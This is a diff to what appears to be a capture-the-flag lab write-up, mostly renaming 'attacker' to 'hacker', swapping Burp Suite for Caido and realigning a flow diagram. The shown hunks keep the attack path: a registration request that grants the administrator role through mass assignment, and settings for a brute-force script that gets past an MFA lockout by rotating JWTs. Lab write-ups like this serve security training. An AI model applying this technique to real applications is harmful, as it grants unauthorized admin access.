@@ -39,7 +39,7 @@ Bypass authentication and MFA controls to access the admin panel and retrieve th
 URL: https://lab-1772235076111-2pzdfx.labs-app.bugforge.io
 
 # Credentials (self-registered via mass assignment)
-Username: attacker
+Username: hacker
 Password: password
 Role: administrator
 ```
@@ -85,17 +85,17 @@ Role: administrator
 
 ```
 ┌─────────────────┐     ┌──────────────────┐     ┌─────────────────┐
-│  POST /api/      │     │  POST /api/login  │     │  POST /api/mfa/ │
-│  register        │────▶│                   │────▶│  verify         │
-│                  │     │  Returns JWT +    │     │                 │
-│  role:           │     │  needsOnboarding  │     │  12 attempts    │
-│  "administrator" │     │                   │     │  per JWT        │
+│ POST /api/      │     │ POST /api/login  │     │  POST /api/mfa/ │
+│ register        │────▶│                  │────▶│  verify         │
+│                 │     │ Returns JWT +    │     │                 │
+│ role:           │     │ needsOnboarding  │     │  12 attempts    │
+│ "administrator" │     │                  │     │  per JWT        │
 └─────────────────┘     └──────────────────┘     └────────┬────────┘
                                                           │
                               ┌────────────────┐          │ Lockout?
-                              │  Re-login for   │◀─────────┘ Rotate!
-                              │  fresh JWT +    │
-                              │  new PIN        │──────────┐
+                              │  Re-login for  │◀─────────┘ Rotate!
+                              │  fresh JWT +   │
+                              │  new PIN       │──────────┐
                               └────────────────┘          │
                                                           ▼
                                                 ┌─────────────────┐
@@ -129,8 +129,8 @@ Content-Type: application/json
 
 {
     "role": "administrator",
-    "username": "attacker",
-    "email": "attacker@test.com",
+    "username": "hacker",
+    "email": "test@test.com",
     "full_name": "admin",
     "password": "password"
 }
@@ -142,8 +142,8 @@ Content-Type: application/json
     "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
     "user": {
         "id": 10,
-        "username": "attacker",
-        "email": "attacker@test.com",
+        "username": "hacker",
+        "email": "test@test.com",
         "full_name": "admin",
         "role": "administrator"
     },
@@ -162,7 +162,7 @@ POST /api/login HTTP/1.1
 Host: lab-1772235076111-2pzdfx.labs-app.bugforge.io
 Content-Type: application/json
 
-{"username":"attacker","password":"password"}
+{"username":"hacker","password":"password"}
 ```
 
 ### Step 3: Identify MFA Weakness
@@ -242,7 +242,7 @@ Retrieved from the admin panel HTML served by `/api/admin/content` after success
 
 ## Tools Used
 
-- **Burp Suite** — Request interception, discovering mass assignment in registration
+- **Caido** — Request interception, discovering mass assignment in registration
 - **Python (requests + threading)** — Multi-threaded MFA brute force script
 - **Custom mfa_brute.py** ([full script below](#brute-force-script)) — Full exploit: login → rotate JWTs → brute force MFA → extract flag
 
@@ -376,7 +376,7 @@ BASE_URL = "https://lab-1772235076111-2pzdfx.labs-app.bugforge.io"
 LOGIN_URL = f"{BASE_URL}/api/login"
 MFA_URL = f"{BASE_URL}/api/mfa/verify"
 
-CREDS = {"username": "attacker", "password": "password"}
+CREDS = {"username": "hacker", "password": "password"}
 BATCH_SIZE = 12      # attempts per JWT
 THREADS = 5          # parallel workers
 ROLLBACK = 5         # rewind on 403
